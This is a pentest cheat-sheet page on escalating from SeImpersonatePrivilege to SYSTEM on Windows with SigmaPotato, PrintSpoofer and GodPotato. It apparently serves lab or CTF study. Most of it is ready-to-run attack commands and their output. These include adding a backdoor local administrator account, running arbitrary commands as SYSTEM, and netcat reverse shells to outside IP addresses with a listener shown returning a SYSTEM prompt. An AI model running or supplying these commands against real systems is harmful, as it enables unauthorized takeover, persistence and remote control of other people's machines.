---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SeImpersonatePrivilege

The `SeImpersonatePrivilege` allows a user to operate under another user's security context, typically by impersonating clients via mechanisms like **named pipes** or **RPC**. This privilege is normally assigned to `administrator` accounts and built-in service accounts like `LOCAL SERVICE`, `NETWORK SERVICE`, and `SERVICE`. While rare for standard users, `SeImpersonatePrivilege` is often accessible when gaining code execution through services like **IIS**, which commonly run under accounts that have it.

> _**Named pipes** are a method of **inter-process communication (IPC)** in Windows. They let two separate processes—either on the same system or across a network—**send and receive data** as if they were reading/writing to a file. Think of a named pipe as a **virtual file** that one process (the server) creates and waits on, while another (the client) connects to it using a known name (like `\\.\pipe\mypipe`). Once connected, both processes can exchange data in real time._

In the context of **privilege escalation**, named pipes can be abused when a **privileged process connects** to a pipe controlled by a lower-privileged attacker. If the attacker has `SeImpersonatePrivilege`, they can **impersonate the connecting user**, effectively hijacking their permissions.

<table><thead><tr><th width="131.66668701171875">Exploit</th><th>Target Mechanism</th><th>Typical Use Case</th><th>OS Compatibility</th></tr></thead><tbody><tr><td><strong>PrintSpoofer</strong></td><td>RPC/Named Pipes (Print API)</td><td>Fast, reliable on many Windows 10/Server versions</td><td>Windows 10/2016–2019 (some patched)</td></tr><tr><td><strong>GodPotato</strong></td><td>COM Server Hijack</td><td>When PrintSpoofer is patched</td><td>Works on newer/modern Windows (10/11)</td></tr><tr><td><strong>SigmaPotato</strong></td><td>Event Log Service</td><td>When PrintSpoofer and GodPotato fail</td><td>Windows 10+ (better support on newer builds)</td></tr></tbody></table>

## SigmaPotato

[**SigmaPotato**](https://github.com/tylerdotrar/SigmaPotato) is a local privilege escalation exploit that leverages the `SeImpersonatePrivilege` and the Event Log service to hijack a SYSTEM token through named pipe impersonation.

{% tabs %}
{% tab title="1. User Creation" %}
{% code overflow="wrap" %}
```powershell
> .\sigmapotato.exe "net user dave4 Pass123! /add"
...
[+] Process Output:
The command completed successfully.


> .\sigmapotato.exe "net localgroup Administrators dave4 /add"
...
[+] Process Output:
The command completed successfully.

> Get-LocalGroupMember administrators
...

User        CLIENTWK220\dave4         Local
```
{% endcode %}
{% endtab %}

{% tab title="2. Command Execution" %}
```powershell
./SigmaPotato.exe <command>
```
{% endtab %}

{% tab title="3. Reverse Shell" %}
```powershell
./SigmaPotato.exe --revshell <ip_addr> <port>
```
{% endtab %}
{% endtabs %}

## PrintSpoofer

[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer) is a local privilege escalation exploit that abuses the `SeImpersonatePrivilege` to impersonate the `SYSTEM` account via a named pipe trick, giving the attacker a `SYSTEM` shell.

{% tabs %}
{% tab title="1. PrivEsc" %}
Escalate to `NT AUTHORITY\SYSTEM` on the same session:

```powershell
PrintSpoofer.exe -i -c cmd
```
{% endtab %}

{% tab title="2. RevShell" %}
Create a new `SYSTEM` process and exit immediately without interacting with it. Suitable for non-interactive cases, e.g. WinRM.

```powershell
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

On the attacking box:

```bash
$ nc -lvpn 1337
...
C:\WINDOWS\system32>whoami
nt authority\system
```
{% endtab %}

{% tab title="3. RDP" %}
&#x20;Spawn a `SYSTEM` command prompt on your desktop, for instance, when logged in via an RDP session.

```powershell
# Check your session ID
C:\TOOLS>qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
 console           Administrator             1  Active
>rdp-tcp           lab-user                  3  Active
 rdp-tcp                                 65536  Listen

C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```
{% endtab %}
{% endtabs %}

## GodPotato

[**GodPotato**](../../../boxes/easy/forest.md) is a local privilege escalation exploit that abuses `COM` and `SeImpersonatePrivilege` to impersonate `SYSTEM` by hijacking privileged tokens via named pipes.

{% tabs %}
{% tab title="1. PrivEsc" %}
```powershell
GodPotato -cmd "cmd /c whoami"
```
{% endtab %}

{% tab title="2. RevShell" %}
```powershell
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="SigmaPotato" %}
{% embed url="https://github.com/tylerdotrar/SigmaPotato" %}
{% endtab %}

{% tab title="PrintSpoofer" %}
{% embed url="https://github.com/itm4n/PrintSpoofer?tab=readme-ov-file" %}
{% endtab %}

{% tab title="GodPotato" %}
{% embed url="https://github.com/BeichenDream/GodPotato" %}
{% endtab %}
{% endtabs %}
